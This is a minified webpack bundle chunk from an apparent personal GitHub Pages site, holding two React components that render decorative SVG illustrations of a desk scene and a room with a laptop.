"use strict";(self.webpackChunk_2h3ph3rd_github_io=self.webpackChunk_2h3ph3rd_github_io||[]).push([[4195],{1619:(e,t,a)=>{a.d(t,{Z:()=>te});var h,r,i,o,l,n,s,c,d,f,u,v,m,p,g,y,b,w,M,z,x,E,q,k,Z,T,G,I,F,S,A,P,H,O,C,L,D,V,_,N,W,j,R,B,U,Q,Y,J,K,X,$=a(7294);function ee(){return ee=Object.assign?Object.assign.bind():function(e){for(var t=1;t<arguments.length;t++){var a=arguments[t];for(var h in a)Object.prototype.hasOwnProperty.call(a,h)&&(e[h]=a[h])}return e},ee.apply(this,arguments)}const te=e=>{let{title:t,titleId:a,...te}=e;return $.createElement("svg",ee({"data-name":"Layer 1",xmlns:"http://www.w3.org/2000/svg",width:655,height:413.68,viewBox:"0 0 655 413.68","aria-labelledby":a},te),t?$.createElement("title",{id:a},t):null,h||(h=$.createElement("path",{d:"M416.563 129.423a122.041 122.041 0 0 1 10.1-38.517q2.28-5.093 5.019-9.961a.744.744 0 0 0-1.284-.75 123.729 123.729 0 0 0-13.768 37.982q-1.033 5.583-1.553 11.246c-.089.952 1.398.946 1.486 0Z",fill:"#e6e6e6"})),r||(r=$.createElement("circle",{cx:435.282,cy:73.914,r:9.414,fill:"#e6e6e6"})),i||(i=$.createElement("path",{d:"M417.526 129.673a79.174 79.174 0 0 1 6.553-24.988q1.479-3.304 3.255-6.462a.483.483 0 0 0-.833-.487 80.268 80.268 0 0 0-8.931 24.641q-.67 3.622-1.008 7.296c-.058.618.907.614.964 0Z",fill:"#e6e6e6"})),o||(o=$.createElement("circle",{cx:429.67,cy:93.662,r:6.108,fill:"#e6e6e6"})),l||(l=$.createElement("path",{d:"M416.309 129.096a79.174 79.174 0 0 1-10.203-23.732q-.865-3.515-1.407-7.098a.483.483 0 0 0-.956.128 80.268 80.268 0 0 0 8.113 24.923q1.7 3.268 3.692 6.372c.335.523 1.094-.074.76-.593Z",fill:"#e6e6e6"})),n||(n=$.createElement("circle",{cx:403.735,cy:93.233,r:6.108,fill:"#e6e6e6"})),$.createElement("path",{d:"M670.06 377.66v-12a4.505 4.505 0 0 1 4.5-4.5h28a4.505 4.505 0 0 1 4.5 4.5v12a4.505 4.505 0 0 1-4.5 4.5h-28a4.505 4.505 0 0 1-4.5-4.5ZM701.56 301.16h-12a4.505 4.505 0 0 1-4.5-4.5v-49a4.505 4.505 0 0 1 4.5-4.5h12a4.505 4.505 0 0 1 4.5 4.5v49a4.505 4.505 0 0 1-4.5 4.5Z",transform:"translate(-272.5 -243.16)",fill:"#f2f2f2",style:{isolation:"isolate"}}),s||(s=$.createElement("path",{fill:"#ccc",d:"M413.059 9.5h20v4h-20zM413.059 40.5h20v4h-20z"})),$.createElement("path",{d:"M731.56 301.16h-12a4.505 4.505 0 0 1-4.5-4.5v-49a4.505 4.505 0 0 1 4.5-4.5h12a4.505 4.505 0 0 1 4.5 4.5v49a4.505 4.505 0 0 1-4.5 4.5Z",transform:"translate(-272.5 -243.16)",fill:"#f2f2f2",style:{isolation:"isolate"}}),c||(c=$.createElement("path",{fill:"#ccc",d:"M443.059 9.5h20v4h-20zM443.059 40.5h20v4h-20z"})),$.createElement("path",{d:"M761.56 301.16h-12a4.505 4.505 0 0 1-4.5-4.5v-49a4.505 4.505 0 0 1 4.5-4.5h12a4.505 4.505 0 0 1 4.5 4.5v49a4.505 4.505 0 0 1-4.5 4.5Z",transform:"translate(-272.5 -243.16)",fill:"#f2f2f2",style:{isolation:"isolate"}}),d||(d=$.createElement("path",{fill:"#ccc",d:"M473.059 9.5h20v4h-20zM473.059 40.5h20v4h-20z"})),$.createElement("path",{d:"M777.56 382.16h-12a4.505 4.505 0 0 1-4.5-4.5v-49a4.505 4.505 0 0 1 4.5-4.5h12a4.505 4.505 0 0 1 4.5 4.5v49a4.505 4.505 0 0 1-4.5 4.5Z",transform:"translate(-272.5 -243.16)",fill:"#f2f2f2",style:{isolation:"isolate"}}),f||(f=$.createElement("path",{fill:"#ccc",d:"M489.059 90.5h20v4h-20zM489.059 121.5h20v4h-20z"})),$.createElement("path",{d:"M807.56 382.16h-12a4.505 4.505 0 0 1-4.5-4.5v-49a4.505 4.505 0 0 1 4.5-4.5h12a4.505 4.505 0 0 1 4.5 4.5v49a4.505 4.505 0 0 1-4.5 4.5Z",transform:"translate(-272.5 -243.16)",fill:"#f2f2f2",style:{isolation:"isolate"}}),u||(u=$.createElement("path",{fill:"#ccc",d:"M519.059 90.5h20v4h-20zM519.059 121.5h20v4h-20z"})),$.createElement("path",{d:"M837.56 382.16h-12a4.505 4.505 0 0 1-4.5-4.5v-49a4.505 4.505 0 0 1 4.5-4.5h12a4.505 4.505 0 0 1 4.5 4.5v49a4.505 4.505 0 0 1-4.5 4.5Z",transform:"translate(-272.5 -243.16)",fill:"#f2f2f2",style:{isolation:"isolate"}}),v||(v=$.createElement("path",{fill:"#ccc",d:"M549.059 90.5h20v4h-20zM549.059 121.5h20v4h-20z"})),$.createElement("path",{d:"M698.56 463.16h-12a4.505 4.505 0 0 1-4.5-4.5v-49a4.505 4.505 0 0 1 4.5-4.5h12a4.505 4.505 0 0 1 4.5 4.5v49a4.505 4.505 0 0 1-4.5 4.5Z",transform:"translate(-272.5 -243.16)",fill:"#f2f2f2",style:{isolation:"isolate"}}),m||(m=$.createElement("path",{fill:"#ccc",d:"M410.059 171.5h20v4h-20zM410.059 202.5h20v4h-20z"})),$.createElement("path",{d:"M728.56 463.16h-12a4.505 4.505 0 0 1-4.5-4.5v-49a4.505 4.505 0 0 1 4.5-4.5h12a4.505 4.505 0 0 1 4.5 4.5v49a4.505 4.505 0 0 1-4.5 4.5Z",transform:"translate(-272.5 -243.16)",fill:"#f2f2f2",style:{isolation:"isolate"}}),p||(p=$.createElement("path",{fill:"#ccc",d:"M440.059 171.5h20v4h-20zM440.059 202.5h20v4h-20z"})),$.createElement("path",{d:"M758.56 463.16h-12a4.505 4.505 0 0 1-4.5-4.5v-49a4.505 4.505 0 0 1 4.5-4.5h12a4.505 4.505 0 0 1 4.5 4.5v49a4.505 4.505 0 0 1-4.5 4.5Z",transform:"translate(-272.5 -243.16)",fill:"#f2f2f2",style:{isolation:"isolate"}}),g||(g=$.createElement("path",{fill:"#ccc",d:"M470.059 171.5h20v4h-20zM470.059 202.5h20v4h-20z"})),$.createElement("path",{d:"M791.56 301.16h-12a4.505 4.505 0 0 1-4.5-4.5v-49a4.505 4.505 0 0 1 4.5-4.5h12a4.505 4.505 0 0 1 4.5 4.5v49a4.505 4.505 0 0 1-4.5 4.5Z",transform:"translate(-272.5 -243.16)",fill:"#f2f2f2",style:{isolation:"isolate"}}),y||(y=$.createElement("path",{fill:"#ccc",d:"M503.059 9.5h20v4h-20zM503.059 40.5h20v4h-20z"})),$.createElement("path",{d:"M821.56 301.16h-12a4.505 4.505 0 0 1-4.5-4.5v-49a4.505 4.505 0 0 1 4.5-4.5h12a4.505 4.505 0 0 1 4.5 4.5v49a4.505 4.505 0 0 1-4.5 4.5Z",transform:"translate(-272.5 -243.16)",fill:"#f2f2f2",style:{isolation:"isolate"}}),b||(b=$.createElement("path",{fill:"#ccc",d:"M533.059 9.5h20v4h-20zM533.059 40.5h20v4h-20z"})),$.createElement("path",{d:"M851.56 301.16h-12a4.505 4.505 0 0 1-4.5-4.5v-49a4.505 4.505 0 0 1 4.5-4.5h12a4.505 4.505 0 0 1 4.5 4.5v49a4.505 4.505 0 0 1-4.5 4.5Z",transform:"translate(-272.5 -243.16)",fill:"#f2f2f2",style:{isolation:"isolate"}}),w||(w=$.createElement("path",{fill:"#ccc",d:"M563.059 9.5h20v4h-20zM563.059 40.5h20v4h-20z"})),$.createElement("path",{d:"M881.56 301.16h-12a4.505 4.505 0 0 1-4.5-4.5v-49a4.505 4.505 0 0 1 4.5-4.5h12a4.505 4.505 0 0 1 4.5 4.5v49a4.505 4.505 0 0 1-4.5 4.5Z",transform:"translate(-272.5 -243.16)",fill:"#f2f2f2",style:{isolation:"isolate"}}),M||(M=$.createElement("path",{fill:"#ccc",d:"M593.059 9.5h20v4h-20zM593.059 40.5h20v4h-20zM654 59.5H369a1 1 0 0 1 0-2h285a1 1 0 0 1 0 2ZM654 140.5H369a1 1 0 0 1 0-2h285a1 1 0 0 1 0 2ZM654 221.5H369a1 1 0 0 1 0-2h285a1 1 0 0 1 0 2Z"})),z||(z=$.createElement("path",{d:"M581.563 210.423a122.041 122.041 0 0 1 10.1-38.517q2.28-5.093 5.019-9.961a.744.744 0 0 0-1.284-.75 123.729 123.729 0 0 0-13.768 37.982q-1.033 5.583-1.553 11.246c-.089.952 1.398.946 1.486 0Z",fill:"#e6e6e6"})),x||(x=$.createElement("circle",{cx:600.282,cy:154.914,r:9.414,fill:"#e6e6e6"})),E||(E=$.createElement("path",{d:"M582.526 210.673a79.174 79.174 0 0 1 6.553-24.988q1.479-3.304 3.255-6.462a.483.483 0 0 0-.833-.487 80.268 80.268 0 0 0-8.931 24.641q-.67 3.622-1.008 7.296c-.058.618.907.614.964 0Z",fill:"#e6e6e6"})),q||(q=$.createElement("circle",{cx:594.67,cy:174.662,r:6.108,fill:"#e6e6e6"})),k||(k=$.createElement("path",{d:"M581.309 210.096a79.174 79.174 0 0 1-10.203-23.732q-.865-3.515-1.407-7.098a.483.483 0 0 0-.956.128 80.268 80.268 0 0 0 8.113 24.923q1.7 3.268 3.692 6.372c.335.523 1.094-.074.76-.593Z",fill:"#e6e6e6"})),Z||(Z=$.createElement("circle",{cx:568.735,cy:174.233,r:6.108,fill:"#e6e6e6"})),$.createElement("path",{d:"M835.06 458.66v-12a4.505 4.505 0 0 1 4.5-4.5h28a4.505 4.505 0 0 1 4.5 4.5v12a4.505 4.505 0 0 1-4.5 4.5h-28a4.505 4.505 0 0 1-4.5-4.5Z",transform:"translate(-272.5 -243.16)",fill:"#f2f2f2",style:{isolation:"isolate"}}),T||(T=$.createElement("path",{d:"M382 363.5H1a1 1 0 0 1 0-2h381a1 1 0 0 1 0 2Z",fill:"#3f3d56"})),G||(G=$.createElement("circle",{cx:199.059,cy:205.5,r:27,fill:"#2f2e41"})),I||(I=$.createElement("path",{fill:"#ffb8b8",d:"m173.405 378.826-.715-12.238 46.866-8.585 1.056 18.064-47.207 2.759z"})),F||(F=$.createElement("path",{d:"m175.675 357.641 1.38 23.604-14.861.868-2.249-38.465a14.887 14.887 0 0 1 15.73 13.993Z",fill:"#2f2e41"})),S||(S=$.createElement("path",{fill:"#ffb8b8",d:"m193.789 378.714-7.785 9.471-40.236-25.519 11.489-13.978 36.532 30.026z"})),A||(A=$.createElement("path",{d:"m177.737 392.726 15.014-18.266 11.5 9.453-24.466 29.766a14.887 14.887 0 0 1-2.048-20.953ZM171.387 334.67l-5.32 25.079a4 4 0 0 0 3.848 4.83l52.298.843a4 4 0 0 0 4.004-4.695l-4.575-25.922a4 4 0 0 0-3.939-3.305H175.3a4 4 0 0 0-3.913 3.17Z",fill:"#2f2e41"})),P||(P=$.createElement("path",{d:"M180.06 343.5s-51-32-61-15c-5 8.5-2.5 16.75 1.25 22.875a34.63 34.63 0 0 0 14.402 12.891l41.347 20.234 15-16-10-9ZM206.06 338.5s66-19 53 17-62 22-62 22l-5-15 17-12Z",fill:"#2f2e41"})),H||(H=$.createElement("circle",{cx:199.398,cy:211.665,r:24.561,fill:"#ffb8b8"})),O||(O=$.createElement("path",{d:"M200.685 342.469a131.994 131.994 0 0 1-30.258-3.987l-.292-.08-13.706-63.045a23.225 23.225 0 0 1 14.933-26.943 80.46 80.46 0 0 1 51.3-1.024 23.47 23.47 0 0 1 15.635 27.764L222.99 338.35l-.216.102c-6.362 3.014-14.317 4.017-22.088 4.017Z",fill:"#ccc"})),C||(C=$.createElement("path",{d:"M182.274 347.366a10.056 10.056 0 0 1 14.476-5.312l26.986-23.424 2.442 18.408-26.001 19.422a10.11 10.11 0 0 1-17.903-9.094Z",fill:"#ffb8b8"})),L||(L=$.createElement("path",{d:"M208.012 352.476a4.534 4.534 0 0 1-1.296-.19 4.453 4.453 0 0 1-2.963-2.817l-3.257-9.229a4.472 4.472 0 0 1 1.302-4.902l36.77-22.074-14.495-64.661.369-.09c.15-.036 15-3.416 21.085 12.811 4.262 11.365 20.032 36.077 18.92 52.777a14.885 14.885 0 0 1-12.323 13.727l-41.388 23.713a4.456 4.456 0 0 1-2.724.935Z",fill:"#ccc"})),D||(D=$.createElement("path",{d:"M212.136 345.173a10.056 10.056 0 0 0-14.475-5.313l-26.987-23.424-2.441 18.408 26 19.423a10.11 10.11 0 0 0 17.903-9.094Z",fill:"#ffb8b8"})),V||(V=$.createElement("path",{d:"M189.106 352.476a4.456 4.456 0 0 1-2.724-.935l-44.388-21.713a14.885 14.885 0 0 1-12.322-13.727c-1.113-16.7 17.657-43.412 21.919-54.777 6.085-16.227 20.935-12.848 21.086-12.81l.368.089-17.494 66.66 39.769 20.075a4.472 4.472 0 0 1 1.302 4.902l-3.257 9.229a4.453 4.453 0 0 1-2.963 2.816 4.535 4.535 0 0 1-1.296.19Z",fill:"#ccc"})),_||(_=$.createElement("path",{d:"M242.06 362.5h-89a7.008 7.008 0 0 1-7-7v-49a7.008 7.008 0 0 1 7-7h89a7.008 7.008 0 0 1 7 7v49a7.008 7.008 0 0 1-7 7Z",fill:"#4361ee"})),N||(N=$.createElement("circle",{cx:197.559,cy:331,r:6,fill:"#fff"})),W||(W=$.createElement("path",{d:"M174.59 210.666c-1.455-3.693.933-8.093 4.476-9.881s7.819-1.449 11.609-.27c3.184.99 6.17 2.526 9.276 3.739a20.762 20.762 0 0 0 9.753 1.736c3.315-.374 6.613-2.232 7.97-5.28 1.405-3.158.449-7.013-1.716-9.708a18.8 18.8 0 0 0-8.612-5.535c-7.307-2.575-15.748-2.65-22.532 1.092s-11.394 11.71-9.992 19.33",fill:"#2f2e41"})),j||(j=$.createElement("path",{d:"M32.662 351.818a122.042 122.042 0 0 1 10.101-38.517q2.28-5.092 5.018-9.96a.744.744 0 0 0-1.283-.75 123.728 123.728 0 0 0-13.768 37.982q-1.034 5.583-1.554 11.245c-.088.953 1.399.947 1.486 0Z",fill:"#e6e6e6"})),R||(R=$.createElement("circle",{cx:51.381,cy:296.31,r:9.414,fill:"#4361ee"})),B||(B=$.createElement("path",{d:"M33.625 352.069a79.174 79.174 0 0 1 6.553-24.988q1.48-3.304 3.256-6.462a.483.483 0 0 0-.833-.487 80.269 80.269 0 0 0-8.932 24.64q-.67 3.623-1.008 7.297c-.057.617.908.613.965 0Z",fill:"#e6e6e6"})),U||(U=$.createElement("circle",{cx:45.769,cy:316.058,r:6.108,fill:"#4361ee"})),Q||(Q=$.createElement("path",{d:"M32.408 351.492a79.174 79.174 0 0 1-10.202-23.733q-.866-3.514-1.408-7.097a.483.483 0 0 0-.956.128 80.268 80.268 0 0 0 8.113 24.923q1.7 3.268 3.693 6.372c.335.522 1.093-.074.76-.593Z",fill:"#e6e6e6"})),Y||(Y=$.createElement("circle",{cx:19.835,cy:315.629,r:6.108,fill:"#4361ee"})),$.createElement("path",{d:"M286.159 600.056v-12a4.505 4.505 0 0 1 4.5-4.5h28a4.505 4.505 0 0 1 4.5 4.5v12a4.505 4.505 0 0 1-4.5 4.5h-28a4.505 4.505 0 0 1-4.5-4.5Z",transform:"translate(-272.5 -243.16)",fill:"#f2f2f2",style:{isolation:"isolate"}}),J||(J=$.createElement("path",{d:"M314.409 370.9c0 6.578-5.332 9.567-11.909 9.567s-11.909-2.99-11.909-9.566 2.647-14.252 11.909-11.605c9.262-3.97 11.909 5.028 11.909 11.605Z",fill:"#ff6584"})),K||(K=$.createElement("path",{d:"M301.92 362.377a1.904 1.904 0 0 1-1.891-1.66c-.394-3.28-2.568-9.707-3.484-12.318a1.703 1.703 0 0 1 .22-1.567 1.787 1.787 0 0 1 2.663-.192 1.705 1.705 0 0 1 .469 1.276c-.18 3.35 2.263 8.765 3.735 11.694a1.908 1.908 0 0 1-1.51 2.756 1.763 1.763 0 0 1-.202.01Z",fill:"#3f3d56"})),X||(X=$.createElement("path",{d:"M310.732 354.985c4.134-3.383.89-10.307-4.283-8.978a4.178 4.178 0 0 0-1.864.994c-3.174 2.998-3.666 10.67-3.666 10.67s5.605.759 9.813-2.686Z",fill:"#3f3d56"})))}},6421:(e,t,a)=>{a.d(t,{Z:()=>Ue});var h,r,i,o,l,n,s,c,d,f,u,v,m,p,g,y,b,w,M,z,x,E,q,k,Z,T,G,I,F,S,A,P,H,O,C,L,D,V,_,N,W,j,R,B,U,Q,Y,J,K,X,$,ee,te,ae,he,re,ie,oe,le,ne,se,ce,de,fe,ue,ve,me,pe,ge,ye,be,we,Me,ze,xe,Ee,qe,ke,Ze,Te,Ge,Ie,Fe,Se,Ae,Pe,He,Oe,Ce,Le,De,Ve,_e,Ne,We,je,Re=a(7294);function Be(){return Be=Object.assign?Object.assign.bind():function(e){for(var t=1;t<arguments.length;t++){var a=arguments[t];for(var h in a)Object.prototype.hasOwnProperty.call(a,h)&&(e[h]=a[h])}return e},Be.apply(this,arguments)}const Ue=e=>{let{title:t,titleId:a,...Ue}=e;return Re.createElement("svg",Be({"data-name":"Layer 1",xmlns:"http://www.w3.org/2000/svg",width:786.82,height:572.258,viewBox:"0 0 786.82 572.258","aria-labelledby":a},Ue),t?Re.createElement("title",{id:a},t):null,h||(h=Re.createElement("circle",{cx:458.321,cy:74.182,r:26.701,fill:"#f2f2f2"})),r||(r=Re.createElement("path",{d:"M665.447 497.152c39.688-30.229 58.644-81.026 46.777-129.482q-.442-1.806-.934-3.604c-7.867-28.764-27.331-56.1-55.7-65.291-23.82-7.717-49.82-1.783-74.67-4.852-48.78-6.024-86.6-45.494-113.21-86.82-26.611-41.325-47.062-87.583-82.422-121.723-58.285-56.276-153.362-68.392-225.627-31.76C87.397 90.25 41.365 171.52 43.328 252.513c1.963 80.995 50.046 158.432 119.875 199.517 25.652 15.093 55.321 25.786 84.848 22.044 25.62-3.246 48.9-17.012 74.399-21.1 40.09-6.425 79.927 11.701 114.602 32.824 34.676 21.123 68.17 46.16 107.575 55.953 38.261 9.508 85.663-17.822 120.82-44.6Z",fill:"#f2f2f2"})),i||(i=Re.createElement("path",{d:"M608.426 55.32c-.87-.58-1.75-1.13-2.62-1.69a380.24 380.24 0 0 0-80.31-38.93l-6.54 90.22h-41.46V1.53c-2.61-.54-5.24-1.05-7.87-1.53v104.92h-49.27A102.27 102.27 0 0 1 318.086 2.65c-2.64.57-5.26 1.18-7.88 1.83v100.44h-40.13l-6.23-86.03a380.858 380.858 0 0 0-81.94 43.53c-.44.3-.88.61-1.31.91-2.21 1.55-4.39 3.13-6.56 4.73v344.19h118.27l-2.09-28.95-11.5-158.95h231.59l-11.5 158.95-2.09 28.95h116.96V58.8q-2.61-1.77-5.25-3.48ZM310.206 198.1h-33.39l-6.17-85.3h39.56Zm159.42 0h-56.08v-1.69a6.18 6.18 0 0 0-6.19-6.18h-24.38a6.178 6.178 0 0 0-6.18 6.18v1.69h-58.71v-85.3h151.54Zm7.87 0v-85.3h40.89l-6.17 85.3ZM0 434.29a289.003 289.003 0 0 0 28.12 28.95l730.58 1a289.003 289.003 0 0 0 28.12-28.95Z",fill:"#3f3d56"})),o||(o=Re.createElement("path",{d:"M495.43 341.591v85.704a4.122 4.122 0 0 0 4.119 4.12h127.004a4.122 4.122 0 0 0 4.12-4.12v-85.704a4.124 4.124 0 0 0-4.12-4.114H499.55a4.124 4.124 0 0 0-4.12 4.114Z",fill:"#3f3d56"})),l||(l=Re.createElement("path",{d:"M498.41 342.658v83.58a2.205 2.205 0 0 0 2.2 2.201h124.886a2.205 2.205 0 0 0 2.202-2.2v-83.581a2.206 2.206 0 0 0-2.202-2.206H500.611a2.206 2.206 0 0 0-2.202 2.206Z",fill:"#4361ee"})),n||(n=Re.createElement("path",{d:"M492.774 444.01a2.47 2.47 0 0 0 1.943.93H630.71a2.502 2.502 0 0 0 2.446-3.016l-2.11-10.027a2.507 2.507 0 0 0-1.559-1.818 2.425 2.425 0 0 0-.888-.168H496.82a2.424 2.424 0 0 0-.888.168 2.507 2.507 0 0 0-1.558 1.818l-2.111 10.027a2.5 2.5 0 0 0 .51 2.086Z",fill:"#2f2e41"})),s||(s=Re.createElement("rect",{x:830.034,y:595.588,width:4.188,height:2.513,rx:.488,transform:"rotate(-180 728.833 514.91)",fill:"#3f3d56"})),c||(c=Re.createElement("rect",{x:821.657,y:595.588,width:4.188,height:2.513,rx:.488,transform:"rotate(-180 720.456 514.91)",fill:"#3f3d56"})),d||(d=Re.createElement("rect",{x:813.28,y:595.588,width:4.188,height:2.513,rx:.488,transform:"rotate(-180 712.08 514.91)",fill:"#3f3d56"})),f||(f=Re.createElement("rect",{x:804.903,y:595.588,width:4.188,height:2.513,rx:.488,transform:"rotate(-180 703.702 514.91)",fill:"#3f3d56"})),u||(u=Re.createElement("rect",{x:796.526,y:595.588,width:4.188,height:2.513,rx:.488,transform:"rotate(-180 695.325 514.91)",fill:"#3f3d56"})),v||(v=Re.createElement("rect",{x:788.149,y:595.588,width:4.188,height:2.513,rx:.488,transform:"rotate(-180 686.948 514.91)",fill:"#3f3d56"})),m||(m=Re.createElement("rect",{x:779.772,y:595.588,width:4.188,height:2.513,rx:.488,transform:"rotate(-180 678.571 514.91)",fill:"#3f3d56"})),p||(p=Re.createElement("rect",{x:771.395,y:595.588,width:4.188,height:2.513,rx:.488,transform:"rotate(-180 670.194 514.91)",fill:"#3f3d56"})),g||(g=Re.createElement("rect",{x:763.018,y:595.588,width:4.188,height:2.513,rx:.488,transform:"rotate(-180 661.817 514.91)",fill:"#3f3d56"})),y||(y=Re.createElement("rect",{x:754.641,y:595.588,width:4.188,height:2.513,rx:.488,transform:"rotate(-180 653.44 514.91)",fill:"#3f3d56"})),b||(b=Re.createElement("rect",{x:746.264,y:595.588,width:4.188,height:2.513,rx:.488,transform:"rotate(-180 645.063 514.91)",fill:"#3f3d56"})),w||(w=Re.createElement("rect",{x:737.887,y:595.588,width:4.188,height:2.513,rx:.488,transform:"rotate(-180 636.686 514.91)",fill:"#3f3d56"})),M||(M=Re.createElement("rect",{x:729.51,y:595.588,width:4.188,height:2.513,rx:.488,transform:"rotate(-180 628.31 514.91)",fill:"#3f3d56"})),z||(z=Re.createElement("rect",{x:721.133,y:595.588,width:4.188,height:2.513,rx:.488,transform:"rotate(-180 619.932 514.91)",fill:"#3f3d56"})),x||(x=Re.createElement("rect",{x:712.756,y:595.588,width:4.188,height:2.513,rx:.488,transform:"rotate(-180 611.555 514.91)",fill:"#3f3d56"})),E||(E=Re.createElement("rect",{x:704.379,y:595.588,width:4.188,height:2.513,rx:.488,transform:"rotate(-180 603.178 514.91)",fill:"#3f3d56"})),q||(q=Re.createElement("rect",{x:830.133,y:599.777,width:4.188,height:2.513,rx:.488,transform:"rotate(-180 728.932 519.098)",fill:"#3f3d56"})),k||(k=Re.createElement("rect",{x:821.756,y:599.777,width:4.188,height:2.513,rx:.488,transform:"rotate(-180 720.555 519.098)",fill:"#3f3d56"})),Z||(Z=Re.createElement("rect",{x:813.379,y:599.777,width:4.188,height:2.513,rx:.488,transform:"rotate(-180 712.178 519.098)",fill:"#3f3d56"})),T||(T=Re.createElement("rect",{x:805.002,y:599.777,width:4.188,height:2.513,rx:.488,transform:"rotate(-180 703.801 519.098)",fill:"#3f3d56"})),G||(G=Re.createElement("rect",{x:796.625,y:599.777,width:4.188,height:2.513,rx:.488,transform:"rotate(-180 695.424 519.098)",fill:"#3f3d56"})),I||(I=Re.createElement("rect",{x:788.248,y:599.777,width:4.188,height:2.513,rx:.488,transform:"rotate(-180 687.047 519.098)",fill:"#3f3d56"})),F||(F=Re.createElement("rect",{x:779.871,y:599.777,width:4.188,height:2.513,rx:.488,transform:"rotate(-180 678.67 519.098)",fill:"#3f3d56"})),S||(S=Re.createElement("rect",{x:771.494,y:599.777,width:4.188,height:2.513,rx:.488,transform:"rotate(-180 670.293 519.098)",fill:"#3f3d56"})),A||(A=Re.createElement("rect",{x:763.117,y:599.777,width:4.188,height:2.513,rx:.488,transform:"rotate(-180 661.916 519.098)",fill:"#3f3d56"})),P||(P=Re.createElement("rect",{x:754.74,y:599.777,width:4.188,height:2.513,rx:.488,transform:"rotate(-180 653.54 519.098)",fill:"#3f3d56"})),H||(H=Re.createElement("rect",{x:746.363,y:599.777,width:4.188,height:2.513,rx:.488,transform:"rotate(-180 645.162 519.098)",fill:"#3f3d56"})),O||(O=Re.createElement("rect",{x:737.986,y:599.777,width:4.188,height:2.513,rx:.488,transform:"rotate(-180 636.785 519.098)",fill:"#3f3d56"})),C||(C=Re.createElement("rect",{x:729.609,y:599.777,width:4.188,height:2.513,rx:.488,transform:"rotate(-180 628.408 519.098)",fill:"#3f3d56"})),L||(L=Re.createElement("rect",{x:721.232,y:599.777,width:4.188,height:2.513,rx:.488,transform:"rotate(-180 620.031 519.098)",fill:"#3f3d56"})),D||(D=Re.createElement("rect",{x:712.855,y:599.777,width:4.188,height:2.513,rx:.488,transform:"rotate(-180 611.654 519.098)",fill:"#3f3d56"})),V||(V=Re.createElement("rect",{x:704.478,y:599.777,width:4.188,height:2.513,rx:.488,transform:"rotate(-180 603.277 519.098)",fill:"#3f3d56"})),_||(_=Re.createElement("rect",{x:760.604,y:604.803,width:33.508,height:2.513,rx:.488,transform:"rotate(-180 674.063 524.124)",fill:"#3f3d56"})),N||(N=Re.createElement("rect",{x:515.631,y:358.737,width:5.966,height:3.122,rx:1.561,fill:"#fff"})),W||(W=Re.createElement("rect",{x:548.154,y:358.737,width:5.966,height:3.122,rx:1.561,fill:"#fff"})),j||(j=Re.createElement("rect",{x:557.369,y:358.737,width:5.966,height:3.122,rx:1.561,fill:"#fff"})),R||(R=Re.createElement("rect",{x:524.477,y:358.477,width:20.796,height:3.122,rx:1.561,fill:"#fff"})),B||(B=Re.createElement("rect",{x:567.841,y:358.477,width:20.796,height:3.122,rx:1.561,fill:"#fff"})),U||(U=Re.createElement("rect",{x:524.304,y:365.784,width:5.966,height:3.122,rx:1.561,fill:"#fff"})),Q||(Q=Re.createElement("rect",{x:556.827,y:365.784,width:5.966,height:3.122,rx:1.561,fill:"#fff"})),Y||(Y=Re.createElement("rect",{x:566.042,y:365.784,width:5.966,height:3.122,rx:1.561,fill:"#fff"})),J||(J=Re.createElement("rect",{x:533.15,y:365.523,width:20.796,height:3.122,rx:1.561,fill:"#fff"})),K||(K=Re.createElement("rect",{x:576.514,y:365.523,width:20.796,height:3.122,rx:1.561,fill:"#fff"})),X||(X=Re.createElement("rect",{x:532.977,y:372.83,width:5.966,height:3.122,rx:1.561,fill:"#fff"})),$||($=Re.createElement("rect",{x:565.5,y:372.83,width:5.966,height:3.122,rx:1.561,fill:"#fff"})),ee||(ee=Re.createElement("rect",{x:574.715,y:372.83,width:5.966,height:3.122,rx:1.561,fill:"#fff"})),te||(te=Re.createElement("rect",{x:541.823,y:372.57,width:20.796,height:3.122,rx:1.561,fill:"#fff"})),ae||(ae=Re.createElement("rect",{x:585.187,y:372.57,width:20.796,height:3.122,rx:1.561,fill:"#fff"})),he||(he=Re.createElement("rect",{x:541.649,y:379.877,width:5.966,height:3.122,rx:1.561,fill:"#fff"})),re||(re=Re.createElement("rect",{x:574.172,y:379.877,width:5.966,height:3.122,rx:1.561,fill:"#fff"})),ie||(ie=Re.createElement("rect",{x:583.387,y:379.877,width:5.966,height:3.122,rx:1.561,fill:"#fff"})),oe||(oe=Re.createElement("rect",{x:550.496,y:379.617,width:20.796,height:3.122,rx:1.561,fill:"#fff"})),le||(le=Re.createElement("rect",{x:548.154,y:407.898,width:5.966,height:3.122,rx:1.561,fill:"#fff"})),ne||(ne=Re.createElement("rect",{x:557.369,y:407.898,width:5.966,height:3.122,rx:1.561,fill:"#fff"})),se||(se=Re.createElement("rect",{x:567.841,y:408.158,width:20.796,height:3.122,rx:1.561,fill:"#fff"})),ce||(ce=Re.createElement("rect",{x:515.631,y:407.898,width:5.966,height:3.122,rx:1.561,fill:"#fff"})),de||(de=Re.createElement("rect",{x:524.477,y:408.158,width:20.796,height:3.122,rx:1.561,fill:"#fff"})),fe||(fe=Re.createElement("rect",{x:524.304,y:400.851,width:5.966,height:3.122,rx:1.561,fill:"#fff"})),ue||(ue=Re.createElement("rect",{x:556.827,y:400.851,width:5.966,height:3.122,rx:1.561,fill:"#fff"})),ve||(ve=Re.createElement("rect",{x:566.042,y:400.851,width:5.966,height:3.122,rx:1.561,fill:"#fff"})),me||(me=Re.createElement("rect",{x:533.15,y:401.111,width:20.796,height:3.122,rx:1.561,fill:"#fff"})),pe||(pe=Re.createElement("rect",{x:532.977,y:393.804,width:5.966,height:3.122,rx:1.561,fill:"#fff"})),ge||(ge=Re.createElement("rect",{x:565.5,y:393.804,width:5.966,height:3.122,rx:1.561,fill:"#fff"})),ye||(ye=Re.createElement("rect",{x:574.715,y:393.804,width:5.966,height:3.122,rx:1.561,fill:"#fff"})),be||(be=Re.createElement("rect",{x:541.823,y:394.064,width:20.796,height:3.122,rx:1.561,fill:"#fff"})),we||(we=Re.createElement("rect",{x:541.649,y:386.758,width:5.966,height:3.122,rx:1.561,fill:"#fff"})),Me||(Me=Re.createElement("rect",{x:574.172,y:386.758,width:5.966,height:3.122,rx:1.561,fill:"#fff"})),ze||(ze=Re.createElement("rect",{x:583.387,y:386.758,width:5.966,height:3.122,rx:1.561,fill:"#fff"})),xe||(xe=Re.createElement("rect",{x:550.496,y:387.018,width:20.796,height:3.122,rx:1.561,fill:"#fff"})),Ee||(Ee=Re.createElement("path",{d:"m504.917 490.482-13.35-21.102 41.903-33.403 17.295-19.16a19.161 19.161 0 0 1 32.418 6.827 19.161 19.161 0 0 1-11.57 23.991l-27.349 